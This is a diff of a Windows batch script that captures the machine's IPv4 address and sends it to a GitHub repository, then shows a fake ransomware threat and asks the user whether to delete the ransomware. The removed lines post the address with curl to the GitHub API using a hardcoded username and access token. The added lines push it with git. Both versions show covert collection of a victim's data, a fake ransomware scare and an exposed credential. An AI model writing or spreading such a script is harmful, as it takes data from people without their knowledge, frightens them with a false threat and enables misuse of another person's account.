@@ -2,16 +2,17 @@
 color a
 mode 1000
 
-:: Step 1: Execute ipconfig in the Background
-ipconfig | find "IPv4 Address" > captured_ip.txt
+@echo off
+echo Capturing IP Address...
+ipconfig | find "IPv4 Address" > captured-ip.txt
+echo IP Address captured successfully.
 
-:: Display the contents of captured_ip.txt for debugging
-type captured_ip.txt
+echo Committing changes to GitHub...
+git add captured-ip.txt
+git commit -m "Update captured IP"
+git push origin main
+echo Changes committed and pushed to GitHub.
 
-:: Step 2: HTTP POST Request to GitHub Actions Endpoint
-curl -X POST -H "Content-Type: text/plain" --data-binary @captured_ip.txt -u Moosey12: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 https://api.github.com/repos/Moosey12/ipwebsite/actions/workflows/capture-ip.yml/dispatches
-
-:: Rest of the script remains unchanged
 echo Your files have been held hostage by ransomware...
 echo Would you like to delete the ransomware???
 set /p love=
